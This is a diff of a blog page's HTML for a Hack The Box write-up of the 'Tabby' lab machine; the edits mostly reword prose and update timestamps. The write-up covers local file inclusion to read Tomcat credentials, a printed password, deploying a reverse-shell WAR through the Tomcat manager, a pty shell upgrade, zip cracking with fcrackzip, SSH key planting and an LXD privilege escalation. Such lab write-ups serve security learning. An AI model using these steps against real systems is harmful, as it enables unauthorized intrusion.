@@ -23,7 +23,7 @@
     <meta property="og:url" content="https://inesmartins.github.io//dnp-htb-2/" />
     <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" />
     <meta property="article:published_time" content="2020-11-07T21:59:12.000Z" />
-    <meta property="article:modified_time" content="2020-11-07T22:04:15.000Z" />
+    <meta property="article:modified_time" content="2020-11-07T22:17:24.000Z" />
     <meta property="article:tag" content="htb" />
     <meta property="article:tag" content="tomcat" />
     <meta property="article:tag" content="fcrackzip" />
@@ -71,7 +71,7 @@
     "headline": "HTB Write-up | Tabby",
     "url": "https://inesmartins.github.io//dnp-htb-2/",
     "datePublished": "2020-11-07T21:59:12.000Z",
-    "dateModified": "2020-11-07T22:04:15.000Z",
+    "dateModified": "2020-11-07T22:17:24.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png",
@@ -176,7 +176,7 @@
                             <h4 class="author-name"><a href="/author/ines/">Inês Martins</a></h4>
                             <div class="byline-meta-content">
                                 <time class="byline-meta-date" datetime="2020-11-07">7 Nov 2020</time>
-                                <span class="byline-reading-time"><span class="bull">&bull;</span> 5 min read</span>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 4 min read</span>
                             </div>
                         </section>
 
@@ -220,9 +220,9 @@ PORT     STATE    SERVICE  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 49.59 seconds</code></pre><h3 id="port-80">Port 80</h3><p>The Apache server running on port <code>80</code> seems to be the website for a hosting company called "Mega Hosting":</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Mega-Hosting-2020-07-01-19-43-52-3.png" class="kg-image"></figure><p>The home page has a link for their "statement on recovering from the data breach". When we click the link we're redirected to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>. This domain is not available, however, if we access the page on the <code>tabby.htb</code> domain we see the following message:</p><pre><code>We apologise to all our customers for the previous data breach.
+Nmap done: 1 IP address (1 host up) scanned in 49.59 seconds</code></pre><h3 id="port-80">Port 80</h3><p>The Apache server running on port <code>80</code> seems to be the website for a hosting company called "Mega Hosting":</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Mega-Hosting-2020-07-01-19-43-52-3.png" class="kg-image"></figure><p>The home page has a link for their "statement on recovering from the data breach". When we click the link we're redirected to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>. If we access the page on the <code>tabby.htb</code> domain (which we had previously configured on <code>/etc/hosts</code>) we see the following message:</p><pre><code>We apologise to all our customers for the previous data breach.
 
-We have changed the site to remove this tool, and have invested heavily in more secure servers</code></pre><p>So, from this statement we understand that a <em>tool </em>was removed from the site, which might be our foothold.</p><p>Also very interesting is the way that the <code>statement</code> file is being fetched, let's see if we can fetch any file we want:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/VULNS.png" class="kg-image"></figure><p>Bingo! </p><hr><h3 id="port-8080">Port 8080</h3><p>When we access port <code>8080</code> we see the "default Tomcat home page".</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Apache-Tomcat-2020-07-01-19-45-46.png" class="kg-image"></figure><p>Since we've already identified a <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Local File Inclusion vulnerability</a> on port <code>80</code>, the next logic step would be to try and access the credentials file on the server, however, this file was not in the typical location, in fact, it took me a couple of hours to find it hosted at <code>usr/share/tomcat9/etc/tomcat-users.xml</code>.</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+We have changed the site to remove this tool, and have invested heavily in more secure servers</code></pre><p>So, from this statement we understand that a <em>tool </em>was removed from the site, which might be our foothold.</p><p>Also very interesting is the way that the <code>statement</code> file is being fetched, let's see if we can fetch any file we want:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/VULNS.png" class="kg-image"></figure><p>Bingo! </p><h3 id="port-8080">Port 8080</h3><p>When we access port <code>8080</code> we see the "default Tomcat home page".</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Apache-Tomcat-2020-07-01-19-45-46.png" class="kg-image"></figure><p>Since we've already identified a <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Local File Inclusion vulnerability</a> on port <code>80</code>, the next logic step would be to try and access the credentials file on the server, however, this file was not in the typical location, in fact, it took me a couple of hours to find it hosted at <code>usr/share/tomcat9/etc/tomcat-users.xml</code>.</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 ...
 &lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -253,10 +253,10 @@ FAIL - Deployed application at context path [/shelly] but context failed to star
 
 ~ curl -T "./shelly.war" "http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true" -u tomcat
 Enter host password for user 'tomcat': $3cureP4s5w0rd123!
-OK - Deployed application at context path [/shelly]</code></pre><p>Now when we access <code>http://tabby.htb:8080/shelly/</code> we get a reverse shell. <br>Let's upgrade it!</p><pre><code>~ /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>I tried authenticating with <code>su</code> as the user <code>ash</code> with the password we already know and also with  <code>clive</code>, which we found on the <code>/etc/passwd</code> file, but both failed.</p><h3 id="looking-for-anything-interesting">Looking for Anything Interesting</h3><p>We start by looking for files belonging to <code>ash</code> and come across an interesting zip file:</p><pre><code>tomcat@tabby:/var$ find ./ -user ash
+OK - Deployed application at context path [/shelly]</code></pre><p>Now when we access <code>http://tabby.htb:8080/shelly/</code> we get a reverse shell. <br>Let's upgrade it!</p><pre><code>~ /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>I tried authenticating with <code>su</code> as the user <code>ash</code> with the password we already know and also with  <code>clive</code>, which we found on the <code>/etc/passwd</code> file, but both failed.</p><h3 id="becoming-ash">Becoming ash</h3><p>I started by looking for files belonging to <code>ash</code>, which led me to an interesting zip file:</p><pre><code>tomcat@tabby:/var$ find ./ -user ash
 ...
 ./www/html/files
-./www/html/files/16162020_backup.zip</code></pre><p>The file is password protected but neither <code>clive</code> nor <code>$3cureP4s5w0rd123!</code> work. Let's try to bruteforce it!  First we need to <a href="https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/">download the file</a> to our machine and then we can use a zip file cracker, such as <code>fcrackzip</code> to get the password:</p><pre><code>kali@kali:~/$ fcrackzip -D -p rockyou.txt tabby.zip -u
+./www/html/files/16162020_backup.zip</code></pre><p>The file was password protected and neither <code>clive</code> nor <code>$3cureP4s5w0rd123!</code> worked. In order to brute-force the answer I first <a href="https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/">downloaded the file</a> to my machine and then used a zip file cracker - <code>fcrackzip</code> :</p><pre><code>kali@kali:~/$ fcrackzip -D -p rockyou.txt tabby.zip -u
 PASSWORD FOUND!!!!: pw == admin@it
 
 kali@kali:~/$ unzip tabby.zip 
@@ -271,8 +271,8 @@ Archive:  tabby.zip
 su - ash
 Password: admin@it
 
-ash@tabby:~$ cat user.txt</code></pre><p>Finally, let's SSL into the machine after adding the public key to <code>/home/ash/.ssh/authorized_key</code>:</p><pre><code>ssh -i ash@tabby.htb</code></pre><hr><h2 id="getting-root">Getting root</h2><pre><code>ash@tabby:~$ ls
-alpine-v3.12-x86_64-20200710_0223.tar.gz  snap  user.txt</code></pre><p>Seeing the <code>alpine</code> zip file I realised the privilege escalation will probably be related to <code>lxd</code>. As always, I <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">followed</a> this article and got the root flag.</p>
+ash@tabby:~$ cat user.txt</code></pre><p>Finally, I SSHed into the machine after adding the public key to <code>/home/ash/.ssh/authorized_key</code>:</p><pre><code>ssh -i ash@tabby.htb</code></pre><hr><h2 id="getting-root">Getting root</h2><pre><code>ash@tabby:~$ ls
+alpine-v3.12-x86_64-20200710_0223.tar.gz  snap  user.txt</code></pre><p>Seeing the <code>alpine</code> zip file I realised the privilege escalation will probably be related to <code>lxd</code>. </p><p>I <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">followed</a> this article and got the root flag.</p><hr>
                 </div>
             </section>
 
